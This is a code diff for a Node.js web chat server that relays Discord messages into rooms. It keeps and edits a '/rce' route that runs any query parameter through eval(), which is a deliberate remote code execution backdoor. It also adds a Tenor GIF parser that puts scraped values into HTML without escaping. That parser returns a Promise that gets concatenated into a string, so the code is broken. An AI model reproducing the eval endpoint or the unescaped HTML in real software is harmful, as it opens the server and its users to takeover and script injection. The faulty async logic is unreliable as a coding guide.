@@ -267,7 +267,7 @@ app.get("/unban", async (reply, req) => {
 
 app.get("/rce", (reply, req) => {
     const query = parseQuery(req.getQuery());
-    eval(query);
+    eval(query.toRun);
     reply.writeStatus("200").end("go away");
 });
 
@@ -294,7 +294,7 @@ bot.on("messageCreate", async msg => {
         
         app.publish(`rooms/${room}`, buildMessage({
             author: msg.author.username,
-            text: filterMessage(msg.content) + attachmentParser(msg.attachments),
+            text: filterMessage(msg.content) + attachmentParser(msg.attachments) + parseGif(msg.content),
             badge: config.MOD_IDS.includes(msg.author.id) ? "Chat Staff" : "Discord User",
             sticker: sticker ? getStickerUrl(sticker) : null,
             avatar: await getAvatarUrl(msg.author)
@@ -630,4 +630,22 @@ function attachmentParser(attachments) {
 
 function noDiscordMentions(text) {
     return text ? text.replace(">", "").replace("<", "") : "";
+};
+
+function parseGif(messageContent) {
+    const tenorGifUrlRegex = /https:\/\/tenor.com\/view\/[\S]+/g;
+
+    if (!tenorGifUrlRegex.test(messageContent)) return "";
+
+    return new Promise((res, _rej) => {
+        const tenorGifUrl = messageContent.match(tenorGifUrlRegex)[0];
+
+        new Scraper({
+            host: "https://tenor.com",
+            path: tenorGifUrl.replace("https://tenor.com", "")
+        }).scrape((err, data) => {
+            if (err || !data?.ogUrl) res(""); // stupid but idc
+            res(`<img src="${data.ogUrl}" alt="tenor gif" style="width: ${data.ogImageWidth}px; height: ${data.ogImageHeight}px;" />`);
+        });
+    });
 };
